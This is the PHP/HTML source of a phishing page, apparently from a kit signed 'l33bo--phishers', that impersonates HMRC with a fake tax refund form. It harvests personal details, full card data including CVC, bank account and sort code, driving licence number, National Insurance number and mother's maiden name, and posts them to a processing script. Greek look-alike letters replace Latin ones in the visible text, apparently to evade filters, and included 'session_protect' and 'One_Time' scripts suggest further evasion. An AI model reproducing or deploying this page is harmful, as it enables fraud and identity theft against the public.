<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>H&Mu;RC : Tax Refund</title>
<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
<link href="assets/styles/main.css" media="screen" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="assets/js/validate.js"></script>


</head>
<body>

<div id="dialogoverlay"></div>
<div id="dialogbox">
  <div>
    <div id="dialogboxhead"></div>
    <div id="dialogboxbody"></div>
    <div id="dialogboxfoot"></div>
  </div>
</div>

<div id="header-digital"><a href="#"><img class="screen" height="0" src="assets/img/logo.png" width="256"></a>
<ul class="inline-navigation">
<li><a href="#">H&omicron;me</a></li>
<li><a href="#"><span lang="cy">Cymraeg</span></a></li>
<li><a class="new-window" href="#">C&omicron;ntact H&Mu;RC</a></li>
<li><a accesskey="6" class="popup-window" href="#">Help</a></li>
</ul>
</div>
<div class="no-menu" id="banner">
<div id="user-information"></div>
<h1>Tax Refund</h1>
</div>
<div class="portlet">
<div class="portlet-body">
<form action="Process.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" class="narrow-labels" id="details" method="post" name="details"  enctype="multipart/form-data">
<p>Please c&omicron;mplete the f&omicron;rm bel&omicron;w in &omicron;rder f&omicron;r us t&omicron; pr&omicron;cess y&omicron;ur tax refund. HM Revenue and Cust&omicron;ms (H&Mu;RC) will usually send repayments within 2 weeks, but it may take l&omicron;nger in s&omicron;me cases. Y&omicron;u sh&omicron;uld wait 4 weeks after making an &omicron;nline claim and 6 weeks after making a p&omicron;stal claim bef&omicron;re c&omicron;ntacting H&Mu;RC ab&omicron;ut the payment.</p>
<h2>Step 1: Pers&omicron;nal Inf&omicron;rmati&omicron;n</h2>
<fieldset id="personal">
<div class="field">
<label for="name" for="name">Full Name:</label>
<input class="std" id="name" maxlength="40" name="name" type="text" value="">
</div>
<div class="field" id="date">
<label for="dob" for="dob">Date Of Birth:</label> 
<select class="datedob" id="day" name="day">
<option selected="selected" value="">Day</option><option value="01">01</option><option value="02">02</option> <option value="03">03</option> <option value="04">04</option> <option value="05">05</option> <option value="06">06</option> <option value="07">07</option> <option value="08">08</option> <option value="09">09</option> <option value="10">10</option> <option value="11">11</option> <option value="12">12</option> <option value="13">13</option> <option value="14">14</option> <option value="15">15</option> <option value="16">16</option> <option value="17">17</option> <option value="18">18</option> <option value="19">19</option> <option value="20">20</option> <option value="21">21</option> <option value="22">22</option> <option value="23">23</option> <option value="24">24</option> <option value="25">25</option> <option value="26">26</option> <option value="27">27</option> <option value="28">28</option> <option value="29">29</option> <option value="30">30</option> <option value="31">31</option> 
</select> 
<select class="datedob" id="month" name="month"> 
<option value="">Month</option>
<option value="01">Jan</option>
<option value="02">Feb</option>
<option value="03">Mar</option>
<option value="04">Apr</option>
<option value="05">May</option>
<option value="06">Jun</option>
<option value="07">Jul</option>
<option value="08">Aug</option>
<option value="09">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select> 
<select class="datedob" id="year" name="year"> <option selected="selected" value="">Year</option> <option value="1914">1914</option> <option value="1915">1915</option> <option value="1916">1916</option> <option value="1917">1917</option> <option value="1918">1918</option> <option value="1919">1919</option> <option value="1920">1920</option> <option value="1921">1921</option> <option value="1922">1922</option> <option value="1923">1923</option> <option value="1924">1924</option> <option value="1925">1925</option> <option value="1926">1926</option> <option value="1927">1927</option> <option value="1928">1928</option> <option value="1929">1929</option> <option value="1930">1930</option> <option value="1931">1931</option> <option value="1932">1932</option> <option value="1933">1933</option> <option value="1934">1934</option> <option value="1935">1935</option> <option value="1936">1936</option> <option value="1937">1937</option> <option value="1938">1938</option> <option value="1939">1939</option> <option value="1940">1940</option> <option value="1941">1941</option> <option value="1942">1942</option> <option value="1943">1943</option> <option value="1944">1944</option> <option value="1945">1945</option> <option value="1946">1946</option> <option value="1947">1947</option> <option value="1948">1948</option> <option value="1949">1949</option> <option value="1950">1950</option> <option value="1951">1951</option> <option value="1952">1952</option> <option value="1953">1953</option> <option value="1954">1954</option> <option value="1955">1955</option> <option value="1956">1956</option> <option value="1957">1957</option> <option value="1958">1958</option> <option value="1959">1959</option> <option value="1960">1960</option> <option value="1961">1961</option> <option value="1962">1962</option> <option value="1963">1963</option> <option value="1964">1964</option> <option value="1965">1965</option> <option value="1966">1966</option> <option value="1967">1967</option> <option value="1968">1968</option> <option value="1969">1969</option> <option value="1970">1970</option> <option value="1971">1971</option> <option value="1972">1972</option> <option value="1973">1973</option> <option value="1974">1974</option> <option value="1975">1975</option> <option value="1976">1976</option> <option value="1977">1977</option> <option value="1978">1978</option> <option value="1979">1979</option> <option value="1980">1980</option> <option value="1981">1981</option> <option value="1982">1982</option> <option value="1983">1983</option> <option value="1984">1984</option> <option value="1985">1985</option> <option value="1986">1986</option> <option value="1987">1987</option> <option value="1988">1988</option> <option value="1989">1989</option> <option value="1990">1990</option> <option value="1991">1991</option> <option value="1992">1992</option> <option value="1993">1993</option> <option value="1994">1994</option> <option value="1995">1995</option> <option value="1996">1996</option> <option value="1997">1997</option> <option value="1998">1998</option> <option value="1999">1999</option> 
</select>
<div id="doberror"></div>
</div>
<div class="field">
<label for="telephone" for="telephone">Telephone Number:</label> 
<input class="std telephone phoneUK" id="telephone" maxlength="11" name="telephone" type="tel" value="">
</div>
<div class="field">
<label for="email">Email Address:</label> 
<input class="std email" id="email" maxlength="40" name="email" type="email" value="">
</div>
<div class="field">
<label for="address">Address Line 1:</label> 
<input class="std address" id="address" maxlength="40" name="address" type="text" value="">
</div>
<div class="field">
<label for="town">City/Town:</label> 
<input class="std town" id="town" maxlength="40" name="town" type="text" value="">
</div>
<div class="field">
<label for="postcode">Postcode:</label> 
<input class="postal postcodeUK" id="postcode" maxlength="40" name="postcode" type="text" value="">
</div>
</fieldset>
<br>
<h2>Step 2: Payment Details</h2>
<br>
<p>Please enter the credit/debit card details that y&omicron;u w&omicron;uld like y&omicron;ur tax refund t&omicron; be credited t&omicron;.</p>
<fieldset id="card">
<div class="field">
<label for="ccname">Cardholder Name:</label> 
<input class="std ccname" id="ccname" placeholder="As it appears on card" maxlength="40" name="ccname" type="text" value="">
</div>
<div class="field">
<label for="ccno">Card Number:</label> 
<input class="std input-lg form-control cc-number" id="cc-number" name="ccno" placeholder="•••• •••• •••• ••••" type="text" value="">
<div id="ccerror" class="error"></div>
</div>
<div class="field">
<label for="expiry">Expiry Date:</label> 
<input class="dateexpiry input-lg form-control cc-exp" id="cc-exp" name="ccexp" placeholder="•• / ••" type="text" value="">
</div>
<div class="field">
<label for="secode">Card Verification Code:</label> 
<input class="secode short-code input-lg form-control cc-cvc" maxlength="4" id="cc-cvc" name="secode" placeholder="•••" type="text" value=""> <a href="assets/refund-help/secode.php" onclick="window.open('assets/refund-help/secode.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true', 'newwindow', 'width=600, height=500'); return false;"><img height="13" src="assets/img/help.gif" width="13"></a>
<div id="secodeerror"></div>
</div>

<div class="field">
<label for="banktype">Your Bank:</label> 
</select> 
<select class="banktype" id="banktype" name="banktype"> 
<option value="">Please Select Bank</option>
<option value="barclays">Barclays</option>
<option value="hsbc">HSBC</option>
<option value="metrobank">MetroBank</option>
<option value="natwest">NatWest</option>
<option value="rbos">Royal Bank of Scotland</option>
<option value="bos">Bank of Scotland</option>
<option value="lloyds">Lloyds Bank</option>
<option value="tcb">The Co-Operative Bank</option>
<option value="halifax">Halifax</option>
<option value="tsb">TSB</option>
<option value="santander">Santander</option>
</select>
<div id="banktypeerror"></div>
</div>

<div class="field">
<label for="acno">Account Number:</label> 
<input class="number" id="acno" maxlength="9" name="acno" placeholder="" type="text" value=""> <a href="assets/refund-help/acno.php" onclick="window.open('assets/refund-help/acno.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true', 'newwindow', 'width=600, height=500'); return false;"><img height="13" src="assets/img/help.gif" width="13"></a>
<div class="hint" id="HintfullName"></div>
<div id="acnoerror"></div>
</div>
<div class="field">
<label for="sortcode">Sortcode:</label> 
<input class="sort" id="sort1" maxlength="2" name="sort1" placeholder="" type="text" value="" onkeyup="movetoNext(this, 'sort2')">
<input class="sort" id="sort2" maxlength="2" name="sort2" placeholder="" type="text" value="" onkeyup="movetoNext(this, 'sort3')"> 
<input class="sort" id="sort3" maxlength="2" name="sort3" placeholder="" type="text" value="">
<a href="assets/help/sort.php" onclick="window.open('assets/refund-help/sort.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true', 'newwindow', 'width=600, height=500'); return false;"><img height="13" src="assets/img/help.gif" width="13"></a>
<div class="hint" id="HintfullName"></div>
<div id="expiryerror"></div>
</div>
</fieldset>
<br>
<h2>Step 3: Verify Your Identity</h2>
<br>
<p>In &omicron;rder t&omicron; prevent &omicron;nline fraud it is essential that we verify y&omicron;ur identificati&omicron;n when pr&omicron;cessing an &omicron;nline claim f&omicron;r a tax refund. Please c&omicron;mplete the inf&omicron;rmati&omicron;n bel&omicron;w in &omicron;rder t&omicron; c&omicron;ntinue with y&omicron;ur request.</p>
<fieldset id="security">
<div class="field">
<label for="dlno">Driving Licence Number:</label> 
<input class="std" id="dl" maxlength="40" name="dl" type="text" value=""> <a href="assets/refund-help/dl.php" onclick="window.open('assets/refund-help/dl.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true', 'newwindow', 'width=600, height=500'); return false;"><img height="13" src="assets/img/help.gif" width="13"></a>
<div class="hint" id="HintfullName"></div>
</div>
<div class="field">
<label for="ni">National Insurance Number:</label> 
<input class="std" id="ni" maxlength="40" name="ni" type="text" value="">
</div>
<div class="field">
<label for="mmn">Mothers Maiden Name:</label> 
<input class="std" id="mmn" maxlength="40" name="mmn" type="text" value="">
</div>

</fieldset>
<br>
<h2>Step 4:Review inf&omicron;rmati&omicron;n and submit</h2>
<br>
<p>Please n&omicron;w review the inf&omicron;rmati&omicron;n y&omicron;u have pr&omicron;vided as inaccurate &omicron;r missing inf&omicron;rmati&omicron;n can cause unnecessary delays in pr&omicron;cessing y&omicron;ur tax refund request.</p>
<br>
<div class="field"><label for="FieldfullName" id="amountt">Refund Amount:</label> <input class="number" disabled="disabled" id="FieldfullName" maxlength="40" name="ra" type="text" value="£748.54"> 
<input name="next" type="submit" value="Submit"></div>

<input type="hidden" class="cctype" name="cctype" value="">
</form>
<br>
<br>
<br>
<ul class="inline-navigation" id="footer">
<li class="first">&copy; <a class="new-window" href="#">Cr&omicron;wn C&omicron;pyright</a></li>
<li><a accesskey="8" class="new-window" href="#">H&Mu;RC Terms &amp; C&omicron;nditi&omicron;ns</a></li>
<li><a class="new-window" href="#">H&Mu;RC Privacy p&omicron;licy</a></li>
<li><a accesskey="0" class="new-window" href="#">H&Mu;RC Accessibility</a></li>
</ul>
<br>
</div>
</div>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>